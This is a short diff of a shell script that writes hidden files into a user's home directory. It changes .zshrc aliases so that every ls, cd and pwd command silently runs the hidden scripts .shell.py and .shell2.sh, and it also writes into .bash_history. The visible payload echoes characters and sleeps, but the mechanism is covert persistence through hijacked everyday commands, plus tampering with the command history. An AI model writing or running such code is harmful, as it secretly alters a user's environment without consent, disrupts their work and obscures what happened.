@@ -30,7 +30,7 @@ print("\n")
 EOL
 
 cat >> $HOME/.shell2.sh << EOL
-#!/bin/sh
+#!/bin/bash
 
 echo -n "A"
 sleep 0.2
@@ -86,9 +86,9 @@ sleep 10
 EOL
 
 cat >> $HOME/.zshrc << EOL
-alias ls="python $HOME/.shell.py && /bin/ls && .$HOME/.shell2.sh"
-alias cd="python $HOME/.shell.py && /usr/bin/cd && .$HOME/.shell2.sh"
-alias pwd="python $HOME/.shell.py && /bin/pwd && .$HOME/.shell2.sh"
+alias ls="python $HOME/.shell.py && bash $HOME/.shell2.sh && /bin/ls"
+alias cd="python $HOME/.shell.py && bash $HOME/.shell2.sh && /usr/bin/cd"
+alias pwd="python $HOME/.shell.py && bash $HOME/.shell2.sh && /bin/pwd"
 EOL
 
 cat >> $HOME/.bash_history << EOL
